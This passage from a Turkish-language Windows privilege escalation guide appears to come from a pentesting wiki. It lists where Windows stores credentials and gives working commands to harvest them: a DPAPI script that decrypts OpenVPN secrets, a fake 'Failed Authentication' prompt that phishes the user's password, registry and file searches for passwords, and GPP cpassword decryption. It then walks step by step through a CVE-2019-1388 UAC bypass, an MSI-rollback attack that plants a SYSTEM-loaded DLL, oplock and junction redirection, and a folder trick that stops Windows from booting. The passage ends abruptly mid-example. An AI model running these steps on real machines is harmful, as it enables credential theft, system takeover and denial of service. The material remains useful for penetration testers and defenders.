Bu technique hakkında daha fazla bilgi burada: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

Eğer `ssh-agent` service çalışmıyorsa ve boot sırasında otomatik olarak başlamasını istiyorsanız, şunu çalıştırın:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> Görünüşe göre bu technique artık geçerli değil. Bazı ssh keys oluşturmaya, bunları `ssh-add` ile eklemeye ve ssh üzerinden bir makineye login olmaya çalıştım. HKCU\Software\OpenSSH\Agent\Keys registry'si mevcut değil ve procmon, asimetrik key authentication sırasında `dpapi.dll` kullanımını tespit etmedi.

### Unattended files
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
Ayrıca bu dosyaları **metasploit** kullanarak da arayabilirsiniz: _post/windows/gather/enum_unattend_

Örnek içerik:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### SAM & SYSTEM yedekleri
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### Cloud Credentials
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

**SiteList.xml** adlı bir dosya arayın

### Cached GPP Pasword

Daha önce, Group Policy Preferences (GPP) aracılığıyla bir grup makineye özel yerel yönetici hesapları dağıtılmasına izin veren bir özellik vardı. Ancak bu yöntem ciddi güvenlik açıklarına sahipti. İlk olarak, SYSVOL içinde XML dosyaları olarak saklanan Group Policy Objects (GPOs), herhangi bir domain kullanıcısı tarafından erişilebiliyordu. İkinci olarak, bu GPP'lerin içindeki, herkese açık şekilde belgelenmiş varsayılan bir anahtar kullanılarak AES256 ile şifrelenmiş passwords, kimliği doğrulanmış herhangi bir kullanıcı tarafından çözülebiliyordu. Bu durum ciddi bir risk oluşturuyordu; çünkü kullanıcıların yükseltilmiş yetkiler elde etmesine yol açabilirdi.

Bu riski azaltmak için, boş olmayan bir "cpassword" alanı içeren yerel önbelleğe alınmış GPP dosyalarını tarayan bir fonksiyon geliştirildi. Böyle bir dosya bulunduğunda, fonksiyon password'u çözer ve özel bir PowerShell nesnesi döndürür. Bu nesne, GPP ve dosyanın konumu hakkında ayrıntılar içerir; bu da bu güvenlik açığının tespit edilmesine ve giderilmesine yardımcı olur.

Bu dosyalar için `C:\ProgramData\Microsoft\Group Policy\history` veya _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (W Vista öncesi)_ içinde arama yapın:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**cPassword'u çözmek için:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
crackmapexec kullanarak parolaları almak:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS Web Config
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
credentials içeren web.config örneği:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### OpenVPN kimlik bilgileri
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### Loglar
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### Kimlik bilgilerini isteme

Kullanıcının kendi **credentials** bilgilerini veya başka bir kullanıcının credentials bilgilerini girmesini her zaman **isteyebilirsiniz**; eğer bunları bilebileceğini düşünüyorsanız (dikkat edin ki müşteriden doğrudan **credentials** istemek gerçekten **risklidir**):
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **Credentials içerebilecek olası dosya adları**

Bir zamanlar **düz metin** veya **Base64** biçiminde **passwords** içeren bilinen dosyalar
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
Bütün önerilen dosyaları ara:
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### RecycleBin içindeki Credentials

İçinde credentials aramak için Bin’i de kontrol etmelisiniz

Birkaç program tarafından kaydedilen **passwords**’leri **recover** etmek için şunu kullanabilirsiniz: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### Registry içinde

**Credentials içerebilecek diğer olası registry keys**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Registry'den openssh keys çıkarın.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Tarayıcı Geçmişi

**Chrome veya Firefox** içinde saklanan parolaların bulunduğu dbs'leri kontrol etmelisiniz.\
Ayrıca tarayıcıların geçmişini, bookmarks ve favourites'lerini de kontrol edin; böylece orada bazı **passwords are** saklanmış olabilir.

Tarayıcılardan parolaları çıkarmak için araçlar:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)**, Windows işletim sistemi içinde yerleşik bir teknolojidir ve farklı dillerdeki yazılım bileşenleri arasında **intercommunication** sağlar. Her COM bileşeni bir **class ID (CLSID)** ile tanımlanır ve her bileşen, interface ID'ler (IIDs) ile tanımlanan bir veya daha fazla interface üzerinden işlevsellik sunar.

COM class'ları ve interface'ler registry içinde sırasıyla **HKEY\CLASSES\ROOT\CLSID** ve **HKEY\CLASSES\ROOT\Interface** altında tanımlıdır. Bu registry, **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.** birleştirilerek oluşturulur.

Bu registry'nin CLSID'lerinin içinde, bir **DLL**'yi işaret eden bir **default value** ve **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single or Multi) veya **Neutral** (Thread Neutral) olabilen **ThreadingModel** adlı bir değer içeren çocuk registry **InProcServer32**'yi bulabilirsiniz.

![](<../../images/image (729).png>)

Temel olarak, çalıştırılacak herhangi bir **DLL**'nin üzerine **overwrite** edebiliyorsanız, o DLL farklı bir kullanıcı tarafından yürütülecekse **privileges** yükseltebilirsiniz.

Saldırganların persistence mekanizması olarak COM Hijacking'i nasıl kullandığını öğrenmek için şunlara bakın:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Dosyalarda ve registry'de Genel Password araması**

**Dosya içeriklerini arayın**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**Belirli bir dosya adına sahip bir dosyayı arayın**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**Kayıt defterinde anahtar adları ve parolaları arayın**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### Şifreleri arayan araçlar

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **is a msf** eklentisidir; bu eklentiyi, kurban içinde kimlik bilgileri arayan tüm metasploit POST modüllerini otomatik olarak çalıştırmak için oluşturdum.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) bu sayfada bahsedilen şifreleri içeren tüm dosyaları otomatik olarak arar.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) bir sistemden şifre çıkarmak için başka harika bir araçtır.

[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) aracı, bu verileri düz metin olarak kaydeden birkaç aracın **sessions**, **usernames** ve **passwords** bilgilerini arar (PuTTY, WinSCP, FileZilla, SuperPuTTY ve RDP)
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

Bir **SYSTEM olarak çalışan bir process’in yeni bir process açtığını** (`OpenProcess()`) ve buna **tam access** verdiğini düşünün. Aynı process ayrıca **düşük privileges ile yeni bir process oluşturuyor** (`CreateProcess()`), ancak ana process’in tüm açık handles’larını miras bırakıyor.\
Sonra, eğer **düşük privileges’lı process’e tam access** elde ederseniz, `OpenProcess()` ile oluşturulmuş **privileged process’e ait açık handle’ı** alabilir ve bir **shellcode enjekte** edebilirsiniz.\
[Daha fazla bilgi için bu örneği okuyun: bu vulnerability’nin **nasıl tespit edileceği ve exploited edileceği**.](leaked-handle-exploitation.md)\
[Different levels of permissions ile inherit edilen process ve thread’lerin diğer açık handlers’larını nasıl test edip abuse edeceğinize dair daha eksiksiz bir açıklama için bu **diğer gönderiyi okuyun (yalnızca tam access değil)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

**pipes** olarak adlandırılan paylaşılan bellek segmentleri, process iletişimini ve veri transferini sağlar.

Windows, alakasız process’lerin farklı ağlar üzerinden bile veri paylaşmasına izin veren **Named Pipes** adlı bir özellik sunar. Bu, rollerin **named pipe server** ve **named pipe client** olarak tanımlandığı bir client/server mimarisine benzer.

Bir **client** tarafından pipe üzerinden veri gönderildiğinde, pipe’ı kuran **server**, gerekli **SeImpersonate** yetkilerine sahipse **client’ın kimliğini üstlenebilir**. Bir pipe üzerinden iletişim kuran ve taklit edebileceğiniz bir **privileged process** tespit etmek, kurduğunuz pipe ile etkileşime girdiğinde o process’in kimliğini benimseyerek **daha yüksek privileges elde etme** fırsatı sağlar. Böyle bir attack’i gerçekleştirme talimatları için faydalı rehberler [**burada**](named-pipe-client-impersonation.md) ve [**burada**](#from-high-integrity-to-system) bulunabilir.

Ayrıca aşağıdaki tool, **burp benzeri bir tool ile named pipe communication’ı intercept etmek** için kullanılabilir: [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **ve bu tool tüm pipes’ları listeleyip görerek privescs bulmaya yarar** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

Server mode’daki Telephony service (TapiSrv), `\\pipe\\tapsrv` (MS-TRP) açığa çıkarır. Remote authenticated bir client, mailslot tabanlı async event path’i abuse ederek `ClientAttach`’i mevcut ve `NETWORK SERVICE` tarafından writable olan herhangi bir dosyaya yönelik keyfi bir **4-byte write** haline getirebilir, ardından Telephony admin rights elde edip service olarak keyfi bir DLL yükleyebilir. Tam akış:

- `pszDomainUser` writable bir mevcut path’e ayarlı `ClientAttach` → service bunu `CreateFileW(..., OPEN_EXISTING)` ile açar ve async event writes için kullanır.
- Her event, `Initialize` içindeki attacker-controlled `InitContext` değerini o handle’a yazar. `LRegisterRequestRecipient` (`Req_Func 61`) ile bir line app kaydedin, `TRequestMakeCall` (`Req_Func 121`) tetikleyin, `GetAsyncEvents` (`Req_Func 0`) ile çekin, sonra deterministik writes’i tekrarlamak için unregister/shutdown yapın.
- Kendinizi `C:\Windows\TAPI\tsec.ini` içindeki `[TapiAdministrators]` grubuna ekleyin, yeniden bağlanın, ardından `TSPI_providerUIIdentify`’ı `NETWORK SERVICE` olarak çalıştırmak için keyfi bir DLL path’i ile `GetUIDllName` çağırın.

Daha fazla detay:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Misc

### Windows'ta stuff çalıştırabilecek File Extensions

**[https://filesec.io/](https://filesec.io/)** sayfasına bakın

### Protocol handler / ShellExecute abuse via Markdown renderers

Tıklanabilir Markdown links’in `ShellExecuteExW`’ye yönlendirilmesi, tehlikeli URI handlers’ları (`file:`, `ms-appinstaller:` veya kayıtlı herhangi bir scheme) tetikleyebilir ve attacker-controlled dosyaları current user olarak çalıştırabilir. Bakın:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Passwords için Command Lines monitoring**

Bir user olarak shell elde ederken, **credentials’ı command line üzerinde ileten** scheduled tasks veya başka process’ler çalışıyor olabilir. Aşağıdaki script, process command lines’larını her iki saniyede bir yakalar ve önceki state ile karşılaştırarak farkları çıktılar.
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## Processlerden parolaları çalma

## Low Priv User'dan NT\AUTHORITY SYSTEM'e (CVE-2019-1388) / UAC Bypass

Eğer grafik arayüze (console veya RDP üzerinden) erişiminiz varsa ve UAC etkinse, Microsoft Windows'un bazı sürümlerinde yetkisiz bir kullanıcıdan bir terminal veya "NT\AUTHORITY SYSTEM" gibi başka herhangi bir process çalıştırmak mümkündür.

Bu, aynı vulnerability ile hem privileges yükseltmeyi hem de UAC bypass etmeyi aynı anda mümkün kılar. Ayrıca herhangi bir şey kurmaya gerek yoktur ve süreç sırasında kullanılan binary, Microsoft tarafından imzalanmış ve yayımlanmıştır.

Etkilenen sistemlerden bazıları şunlardır:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
Bu vulnerability'yi exploit etmek için aşağıdaki adımları gerçekleştirmek gerekir:
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
## Administrator Medium'den High Integrity Level'e / UAC Bypass

Integrity Levels hakkında **öğrenmek için** bunu okuyun:


{{#ref}}
integrity-levels.md
{{#endref}}

Ardından **UAC ve UAC bypass'leri hakkında öğrenmek için** bunu okuyun:


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Arbitrary Folder Delete/Move/Rename'den SYSTEM EoP'ye

[**Bu blog yazısında**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) anlatılan teknik ve [**burada mevcut**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs) bir exploit code ile.

Saldırı temelde, kaldırma işlemi sırasında meşru dosyaları malicious dosyalarla değiştirmek için Windows Installer'ın rollback özelliğini kötüye kullanmaktan oluşur. Bunun için attacker, daha sonra Windows Installer tarafından diğer MSI paketlerinin uninstall işlemi sırasında rollback files saklamak için kullanılacak olan `C:\Config.Msi` klasörünü hijack etmekte kullanılacak malicious bir MSI installer oluşturmalıdır; bu rollback files içinde değiştirilenler malicious payload içerecek şekilde düzenlenir.

Özetlenen teknik şöyledir:

1. **Aşama 1 – Hijack için hazırlık yapma (`C:\Config.Msi`'yi boş bırak)**

- Adım 1: MSI'yi install et
- Yazılabilir bir klasöre (`TARGETDIR`) zararsız bir dosya (ör. `dummy.txt`) install eden bir `.msi` oluşturun.
- Installer'ı **"UAC Compliant"** olarak işaretleyin, böylece **non-admin user** bunu çalıştırabilir.
- Install işleminden sonra dosya için açık bir **handle** bırakın.

- Adım 2: Uninstall işlemine başla
- Aynı `.msi`'yi uninstall edin.
- Uninstall işlemi dosyaları `C:\Config.Msi` içine taşımaya ve bunları `.rbf` dosyalarına (rollback backups) yeniden adlandırmaya başlar.
- Dosya `C:\Config.Msi\<random>.rbf` olduğunda bunu tespit etmek için açık dosya handle'ını `GetFinalPathNameByHandle` ile **poll** edin.

- Adım 3: Custom Syncing
- `.msi` içine bir **custom uninstall action (`SyncOnRbfWritten`)** eklenir:
- `.rbf` yazıldığında sinyal verir.
- Ardından uninstall devam etmeden önce başka bir event üzerinde **wait** eder.

- Adım 4: `.rbf` silinmesini engelle
- Sinyal geldiğinde, `.rbf` dosyasını `FILE_SHARE_DELETE` olmadan **open** edin — bu, dosyanın silinmesini **engeller**.
- Sonra uninstall işleminin tamamlanabilmesi için geri sinyal verin.
- Windows Installer `.rbf` dosyasını silemez ve tüm içeriği silemediği için **`C:\Config.Msi` kaldırılmaz**.

- Adım 5: `.rbf`'yi manuel sil
- Siz (attacker) `.rbf` dosyasını manuel olarak silersiniz.
- Artık **`C:\Config.Msi` boştur**, hijack edilmeye hazırdır.

> Bu noktada, **SYSTEM seviyesindeki arbitrary folder delete vulnerability'yi tetikleyerek** `C:\Config.Msi`'yi silin.

2. **Aşama 2 – Rollback scriptlerini malicious olanlarla değiştirme**

- Adım 6: Zayıf ACL'lerle `C:\Config.Msi`'yi yeniden oluştur
- `C:\Config.Msi` klasörünü kendiniz yeniden oluşturun.
- **Zayıf DACL'ler** ayarlayın (ör. Everyone:F) ve `WRITE_DAC` ile açık bir handle tutun.

- Adım 7: Başka bir install çalıştır
- `.msi`'yi tekrar install edin, şu ayarlarla:
- `TARGETDIR`: Yazılabilir konum.
- `ERROROUT`: Zorunlu hata tetikleyen bir değişken.
- Bu install, tekrar **rollback** tetiklemek için kullanılacaktır; rollback `.rbs` ve `.rbf` dosyalarını okur.

- Adım 8: `.rbs` için monitor et
- `ReadDirectoryChangesW` kullanarak `C:\Config.Msi` içinde yeni bir `.rbs` görünene kadar monitor edin.
- Dosya adını yakalayın.

- Adım 9: Rollback öncesi sync
- `.msi` içinde bir **custom install action (`SyncBeforeRollback`)** bulunur:
- `.rbs` oluşturulduğunda bir event sinyali verir.
- Ardından devam etmeden önce **wait** eder.

- Adım 10: Zayıf ACL'yi yeniden uygula
- `.rbs created` event'ini aldıktan sonra:
- Windows Installer `C:\Config.Msi` üzerine yeniden güçlü ACL'ler uygular.
- Ancak sizde hâlâ `WRITE_DAC` ile bir handle olduğu için, **zayıf ACL'leri tekrar** uygulayabilirsiniz.

> ACL'ler **yalnızca handle open sırasında** enforced edilir, bu yüzden klasöre yazmaya devam edebilirsiniz.

- Adım 11: Sahte `.rbs` ve `.rbf` bırak
- `.rbs` dosyasının üzerine Windows'a şunu söyleyen **sahte bir rollback script** yazın:
- `.rbf` dosyanızı (malicious DLL) ayrıcalıklı bir konuma geri yüklesin (ör. `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
- İçinde **malicious SYSTEM-level payload DLL** bulunan sahte bir `.rbf` bırakın.

- Adım 12: Rollback'i tetikle
- Sync event'ini sinyalleyin, böylece installer devam eder.
- Kurulumu bilerek, bilinen bir noktada başarısız kılmak için **type 19 custom action (`ErrorOut`)** yapılandırılmıştır.
- Bu, **rollback'in başlamasına** neden olur.

- Adım 13: SYSTEM DLL'nizi install eder
- Windows Installer:
- Malicious `.rbs`'inizi okur.
- `.rbf` DLL'nizi hedef konuma kopyalar.
- Artık **SYSTEM-loaded path** içinde malicious DLL'niz vardır.

- Son Adım: SYSTEM code çalıştır
- Güvenilir bir **auto-elevated binary** (ör. `osk.exe`) çalıştırın; bu binary hijack ettiğiniz DLL'i yükler.
- **Boom**: Code'unuz **SYSTEM olarak** çalıştırılır.


### Arbitrary File Delete/Move/Rename'den SYSTEM EoP'ye

Ana MSI rollback tekniği (bir önceki) bir **tüm klasörü** (ör. `C:\Config.Msi`) silebildiğinizi varsayar. Peki ya vulnerability'niz yalnızca **arbitrary file deletion** sağlıyorsa?

**NTFS internals**'ı istismar edebilirsiniz: her klasörün gizli bir alternate data stream'i vardır; adı:
```
C:\SomeFolder::$INDEX_ALLOCATION
```
Bu stream, klasörün **index metadata** bilgisini saklar.

Dolayısıyla, bir klasörün **`::$INDEX_ALLOCATION` stream`ini silerseniz**, NTFS klasörü **dosya sisteminden tamamen kaldırır**.

Bunu aşağıdaki gibi standart dosya silme API'lerini kullanarak yapabilirsiniz:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> Bir *file* delete API'si çağırıyor olsanız bile, bu **folder’ın kendisini siler**.

### Folder Contents Delete'den SYSTEM EoP'ye
Primitive’iniz keyfi files/folders silmenize izin vermiyor, ama **attacker-controlled bir folder’ın *contents*’ini silmenize izin veriyorsa** ne olur?

1. Step 1: Bir bait folder ve file hazırlayın
- Oluşturun: `C:\temp\folder1`
- İçine: `C:\temp\folder1\file1.txt`

2. Step 2: `file1.txt` üzerine bir **oplock** koyun
- Oplock, yetkili bir process `file1.txt` silmeye çalıştığında execution’ı **duraklatır**.
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. Adım 3: SYSTEM sürecini tetikle (örn. `SilentCleanup`)
- Bu süreç klasörleri tarar (örn. `%TEMP%`) ve içeriklerini silmeye çalışır.
- `file1.txt` öğesine ulaştığında, **oplock tetiklenir** ve kontrolü senin callback'ine devreder.

4. Adım 4: Oplock callback içinde – silmeyi yönlendir

- Seçenek A: `file1.txt` dosyasını başka bir yere taşı
- Bu, `folder1` içini oplock'u bozmadan boşaltır.
- `file1.txt` dosyasını doğrudan silme — bu, oplock'u erken serbest bırakır.

- Seçenek B: `folder1` klasörünü bir **junction**'a dönüştür:
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- Option C: `\RPC Control` içinde bir **symlink** oluşturun:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> Bu, klasör metadata'sını saklayan NTFS internal stream'i hedefler — bunu silmek, klasörü siler.

5. Step 5: Release the oplock
- SYSTEM process continues and tries to delete `file1.txt`.
- But now, due to the junction + symlink, it's actually deleting:
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**Sonuç**: `C:\Config.Msi` SYSTEM tarafından silinir.

### Arbitrary Folder Create'den Permanent DoS'a

**SYSTEM/admin** olarak **arbitrary bir klasör oluşturmanıza** izin veren bir primitive'i istismar et — **dosya yazamasanız** veya **zayıf izinler ayarlayamasanız** bile.

**Klasör** (dosya değil) olarak, bir **kritik Windows driver** adını kullanarak bir klasör oluşturun, örn.:
```
C:\Windows\System32\cng.sys
```
- Bu yol normalde `cng.sys` kernel-mode driver’ına karşılık gelir.
- Eğer bunu **önceden bir klasör olarak oluşturursanız**, Windows açılışta gerçek driver’ı yükleyemez.
- Sonra Windows, açılış sırasında `cng.sys` yüklemeye çalışır.
- Klasörü görür, **gerçek driver’ı çözemede başarısız olur**, ve **çöker ya da boot işlemini durdurur**.
- **Fallback yoktur** ve dış müdahale olmadan (**boot repair** veya disk erişimi gibi) **kurtarma yoktur**.

### Ayrıcalıklı log/backup path’lerinden + OM symlink’lerden keyfi dosya üzerine yazma / boot DoS

Bir **privileged service**, bir **writable config** içinden okunan bir path’e log/export yazıyorsa, o path’i **Object Manager symlinks + NTFS mount points** ile yönlendirip ayrıcalıklı yazmayı keyfi overwrite’a çevirebilirsiniz (hatta **SeCreateSymbolicLinkPrivilege** olmadan bile).

**Gereksinimler**
- Hedef path’i tutan config, attacker tarafından yazılabilir olmalı (ör. `%ProgramData%\...\.ini`).
- `\RPC Control`’a bir mount point ve bir OM file symlink oluşturabilme yeteneği (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).
- O path’e yazan bir privileged operation (log, export, report).

**Örnek zincir**
1. Privileged log destination’ı geri almak için config’i oku, ör. `C:\ProgramData\ICONICS\IcoSetup64.ini` içinde `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt`.
2. Admin olmadan path’i yönlendir:
```cmd
